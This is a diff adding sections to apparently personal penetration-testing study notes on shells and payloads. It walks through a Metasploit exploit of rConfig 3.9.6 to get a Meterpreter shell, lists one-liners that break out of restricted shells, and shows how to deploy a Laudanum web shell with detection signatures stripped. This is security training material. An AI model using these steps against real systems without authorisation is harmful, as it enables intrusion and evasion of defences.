@@ -1,6 +1,6 @@
 # Shells & Payloads
 
-> Status: 🟨 In progress (sections 1–9 of 17 filled)
+> Status: 🟨 In progress (sections 1–13 of 17 filled)
 > Date started: 2026-10-26
 > Date finished: 
 
@@ -147,6 +147,49 @@ shell                                              # drop to cmd.exe
 - `C:\Windows\system32>` = cmd; `PS C:\...>` = PowerShell.
 
 **Blind spots:** WSL and PowerShell Core (on Linux) — traffic to/from WSL isn't parsed by Windows Firewall/Defender; malware uses native Python + PowerShell across both to dodge AV/EDR.
+
+## Infiltrating Linux (source notes)
+~70% of web servers run Unix/Linux, so a web-app foothold often lands you on Linux → pivot internally. Questions to ask: distro? shells/langs present? what's the box's role? what app is it hosting? known vulns?
+
+**Example — vulnerable app to shell (rConfig):**
+```text
+nmap -sC -sV <ip>                     # finds Apache/PHP on CentOS, FTP, MySQL → likely web server
+# browse to it → rConfig 3.9.6 (version at the bottom of the login page)
+# research: "rConfig 3.9.6 exploit" → Exploit-DB / MSF
+msf6 > search rconfig
+use exploit/linux/http/rconfig_vendors_auth_file_upload_rce   # (copy .rb into modules/exploits/linux/http if not listed; apt update metasploit-framework)
+set RHOSTS <ip> ; set LHOST <me> ; exploit   # auth → upload PHP payload → trigger → delete → Meterpreter
+shell                                  # drop to a non-tty system shell (as the apache user)
+```
+**Non-tty shell:** no prompt, and `su`/`sudo` often fail (the web/apache user has no shell interpreter set). Spawn a proper TTY (next section).
+
+## Spawning interactive / TTY shells
+A limited ("jail") shell blocks `su`/`sudo`/job control. Upgrade it — replace `/bin/sh` with `/bin/bash` where it exists:
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'   # check first: which python / which python3
+/bin/sh -i                                     # interactive sh
+perl -e 'exec "/bin/sh";'                      # Perl
+ruby -e 'exec "/bin/sh"'                       # Ruby
+lua -e 'os.execute("/bin/sh")'                 # Lua
+awk 'BEGIN {system("/bin/sh")}'                # AWK
+find / -name <f> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;   # via find+awk
+find . -exec /bin/sh \; -quit                  # via find -exec
+vim -c ':!/bin/sh'                             # from vim (or :set shell=/bin/sh then :shell)
+```
+**Check your footing after landing:**
+```bash
+ls -la <path>      # perms on a file/binary
+sudo -l            # what can this account run as sudo (needs a stable shell) — e.g. (ALL:ALL) NOPASSWD: ALL = instant root
+```
+
+## Web shells
+Browser-based shell on a web server — the most common external foothold (perimeters are hardened, but web apps expose SQLi/RFI-LFI/cmd-injection/file-upload). Upload a payload in the server's language (**PHP / JSP / ASP(.NET)**) via an unrestricted upload (profile pic, WAR deploy on Tomcat/Axis2/WebLogic, misconfigured FTP to webroot) → call it in the browser → RCE. Web shells can be unstable (some apps auto-delete uploads), so use one to **upgrade to a reverse shell** for persistence.
+
+**Laudanum** — ready-made web shells for many languages (asp/aspx/jsp/php…), pre-installed on Parrot/Kali at `/usr/share/laudanum`:
+```bash
+cp /usr/share/laudanum/aspx/shell.aspx ./demo.aspx   # edit: add your IP to the allowedIps array; strip ASCII art/comments (signatured)
+# upload demo.aspx via the app's upload feature → browse to it (e.g. /files/demo.aspx) → run commands (cmd /c systeminfo)
+```
 
 ## Upgrade to a full TTY (do this immediately)
 A raw `nc` shell has no tab-complete, no arrows, no `sudo`. Upgrade:
